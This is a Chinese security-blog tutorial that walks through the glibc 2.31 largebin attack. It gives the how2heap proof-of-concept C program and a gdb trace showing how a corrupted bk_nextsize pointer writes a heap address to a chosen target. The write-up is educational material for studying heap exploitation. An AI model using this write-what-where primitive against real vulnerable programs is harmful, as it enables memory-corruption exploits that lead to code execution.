# Largebin Attack for Glibc 2.31

阅读量 **255151**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-06-18 10:30:05

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/t013397345ebb38ba20.jpg)

## 序

最近的题目很多都用到了这种攻击方式，那么就来学习一下，利用该技术能实现向目标地址写一个大值。正好用 how2heap 的例子，并且从源码调试上来学习。

## 新增保护

新版本下新增了两个检查。

    
    
    if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd))
        malloc_printerr ("malloc(): largebin double linked list corrupted (nextsize)");
    
    
    
    if (bck->fd != fwd)
    malloc_printerr ("malloc(): largebin double linked list corrupted (bk)");
    

导致我们传统的`largebin attack`没法使用了。我们就来调试看看新的largebin attack手法是如何实现的。

关于实现利用的代码如下：

    
    
    if ((unsigned long) (size) < (unsigned long) chunksize_nomask (bck->bk)){
        fwd = bck;
        bck = bck->bk;
        victim->fd_nextsize = fwd->fd;
        victim->bk_nextsize = fwd->fd->bk_nextsize;
        fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
    }
    

## 源代码

首先放一下我们的源代码，这里没有做任何修改。

    
    
    #include<stdio.h>
    #include<stdlib.h>
    #include<assert.h>
    
    /*
    
    A revisit to large bin attack for after glibc2.30
    
    Relevant code snippet :
    
        if ((unsigned long) (size) < (unsigned long) chunksize_nomask (bck->bk)){
            fwd = bck;
            bck = bck->bk;
            victim->fd_nextsize = fwd->fd;
            victim->bk_nextsize = fwd->fd->bk_nextsize;
            fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
        }
    
    
    */
    
    int main(){
      /*Disable IO buffering to prevent stream from interfering with heap*/
      setvbuf(stdin,NULL,_IONBF,0);
      setvbuf(stdout,NULL,_IONBF,0);
      setvbuf(stderr,NULL,_IONBF,0);
    
      printf("\n\n");
      printf("Since glibc2.30, two new checks have been enforced on large bin chunk insertion\n\n");
      printf("Check 1 : \n");
      printf(">    if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd))\n");
      printf(">        malloc_printerr (\"malloc(): largebin double linked list corrupted (nextsize)\");\n");
      printf("Check 2 : \n");
      printf(">    if (bck->fd != fwd)\n");
      printf(">        malloc_printerr (\"malloc(): largebin double linked list corrupted (bk)\");\n\n");
      printf("This prevents the traditional large bin attack\n");
      printf("However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n");
    
      printf("====================================================================\n\n");
    
      size_t target = 0;
      printf("Here is the target we want to overwrite (%p) : %lu\n\n",&target,target);
      size_t *p1 = malloc(0x428);
      printf("First, we allocate a large chunk [p1] (%p)\n",p1-2);
      size_t *g1 = malloc(0x18);
      printf("And another chunk to prevent consolidate\n");
    
      printf("\n");
    
      size_t *p2 = malloc(0x418);
      printf("We also allocate a second large chunk [p2]  (%p).\n",p2-2);
      printf("This chunk should be smaller than [p1] and belong to the same large bin.\n");
      size_t *g2 = malloc(0x18);
      printf("Once again, allocate a guard chunk to prevent consolidate\n");
    
      printf("\n");
    
      free(p1);
      printf("Free the larger of the two --> [p1] (%p)\n",p1-2);
      size_t *g3 = malloc(0x438);
      printf("Allocate a chunk larger than [p1] to insert [p1] into large bin\n");
    
      printf("\n");
    
      free(p2);
      printf("Free the smaller of the two --> [p2] (%p)\n",p2-2);
      printf("At this point, we have one chunk in large bin [p1] (%p),\n",p1-2);
      printf("               and one chunk in unsorted bin [p2] (%p)\n",p2-2);
    
      printf("\n");
    
      p1[3] = (size_t)((&target)-4);
      printf("Now modify the p1->bk_nextsize to [target-0x20] (%p)\n",(&target)-4);
    
      printf("\n");
    
      size_t *g4 = malloc(0x438);
      printf("Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n", p2-2, p2-2);
      printf("Since glibc does not check chunk->bk_nextsize if the new inserted chunk is smaller than smallest,\n");
      printf("  the modified p1->bk_nextsize does not trigger any error\n");
      printf("Upon inserting [p2] (%p) into largebin, [p1](%p)->bk_nextsize->fd->nexsize is overwritten to address of [p2] (%p)\n", p2-2, p1-2, p2-2);
    
      printf("\n");
    
      printf("In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n", p2-2, (void *)target);
      printf("Target (%p) : %p\n",&target,(size_t*)target);
    
      printf("\n");
      printf("====================================================================\n\n");
    
      assert((size_t)(p2-2) == target);
    
      return 0;
    }
    

## 调试

为了能够看到在`malloc`中到底执行了什么，我们在当前目录下放入`malloc.c`，也就是放入`malloc`的源码。

首先我们断在下面的位置看下此时堆块的布局。

    
    
      size_t *p1 = malloc(0x428);
      size_t *g1 = malloc(0x18);
      size_t *p2 = malloc(0x418);
      size_t *g2 = malloc(0x18);
    

![](https://p5.ssl.qhimg.com/t011f7fe065306211f7.jpg)

这里的 g1 和 g2 是为了防止两个大的 chunk 释放的时候合并。

此时我们释放我们的 p1，此时会进入unsorted bin中。

![](https://p4.ssl.qhimg.com/t01f7a80c1cebaf71be.jpg)

此时我们再分配一个比 p1 大的 chunk，这样会让 p1 进入 largebin 中。如果这里小了会切割 p1，所以要比 p1，才能让他进入
largebin 中。

![](https://p2.ssl.qhimg.com/t01623bc94ab94c273f.jpg)

然后我们在 free p2，此时 p2 就会被放入到 unsorted bin中。

![](https://p5.ssl.qhimg.com/t01990c544ec476506d.jpg)

此时我们修改 p1 的 bk_nextsize 指向 target-0x20，此时 p1 在 largebin 里。

修改前的 p1：

![](https://p2.ssl.qhimg.com/t01c65d0445f5e4b56e.jpg)

修改后的 p1：

![](https://p5.ssl.qhimg.com/t019fb76cd0ff69843f.jpg)

看下我们的 target-0x20。

![](https://p1.ssl.qhimg.com/t01f005fbcd289b68f1.jpg)

然后我们再 malloc 一个比 p2 大的 chunk（此时 p2 在 unsorted bin 里），那么此时，就会将 p2 从 unsorted
bin 取出，放入到 largebin 里，那么就存在如下代码。

    
    
    if ((unsigned long) (size) < (unsigned long) chunksize_nomask (bck->bk)){
        fwd = bck;
        bck = bck->bk;
        victim->fd_nextsize = fwd->fd;
        victim->bk_nextsize = fwd->fd->bk_nextsize;
        fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
    }
    

最关键就是最后一步，让我们看看到底发生了什么。

我们一路跟进，直到进入 `_int_malloc`中。

![](https://p0.ssl.qhimg.com/t016374c8ed13680f8d.jpg)

我们在源码 malloc.c 中定位到关键代码的位置，因为我们的 p2 的 size 小于 bck->bk( largebin 中最小 size
的chunk )。

![](https://p5.ssl.qhimg.com/t0157f2d2eb88461101.jpg)

然后打下断点。

![](https://p4.ssl.qhimg.com/t0108da45c1dc70c3f6.jpg)

然后 c 继续执行，就会停在关键的位置。

![](https://p2.ssl.qhimg.com/t01b386fa8d20ea6549.jpg)

调试就可以知道在这段关键代码中，victim 是我们的 p2，fwd 为 largebin 的链表头，bck为 largebin
中的最后一个chunk，也就是最小的那个，也就是我们这里的 p1。

![](https://p3.ssl.qhimg.com/t01d22fd6b2c6b5cdb1.jpg)

然后就是下面的三条指令。

    
    
    victim->fd_nextsize = fwd->fd;
    victim->bk_nextsize = fwd->fd->bk_nextsize;
    fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
    

翻译过来就是下面这样。

    
    
    p2->fd_nextsize = &p1
    p2->bk_nextsize = p1->bk_nextsize
    p1->bk_nextsize = (target-0x20)->fd_nextsize = victim
    

前两条指令执行完之前：

![](https://p0.ssl.qhimg.com/t01cfa3c88045603107.jpg)

前两条指令执行完之后：

![](https://p5.ssl.qhimg.com/t014459dfe7a21590c6.jpg)

然后我们注意下第三条指令的`(target-0x20)->fd_nextsize = victim`。

这里 0x20 和 fd_nextsize是可以抵销的，也就是说此时我们可以将`victim`也就是一个堆的地址写在 `target` 上，这就是我们的
目标地址写一个大值，我们来验证下。

![](https://p2.ssl.qhimg.com/t018107eeb0f12a652b.jpg)

从上图我们看到原先我们的 `(target-0x20)->fd_nextsize`的值为 0。当执行完第三条指令后。

![](https://p4.ssl.qhimg.com/t01cdf7addda74f4b55.jpg)

可以看到我们的`fd_nextsize`的位置已经写上了 victim 。

## 总结

通常而言，这种写大数的行为，我们可以用来修改`global_max_fast`。这里为什么想到的，估计是根据`victim->bk_nextsize`可控，那么`victim->bk_nextsize->fd_nextsize`可控就能写入一个`vitcim`。那么为什么`victim->bk_nextsize`，反推回去就是`fwd->fd->bk_nextsize`可控，这个可控翻译过来
**其实就是 largebin 中链表尾部，也就是最小的那个 chunk 的 bk_nextsize 可控，然后再其中写入 目标地址-0x20。**

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **.** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/244018](/post/id/244018)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [largebin attack](/tag/largebin attack)

 **+1** __9赞

 __收藏

![](https://thirdwx.qlogo.cn/mmopen/vi_32/8Fh08IZXW3IRX6aFpdF0f7ictxCRDGGlicib3WWkiaTL15Lj6s3VvjlvP95FuZHhcUg92cPEO3hibD5hzcX0nIfLbYg/132).

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

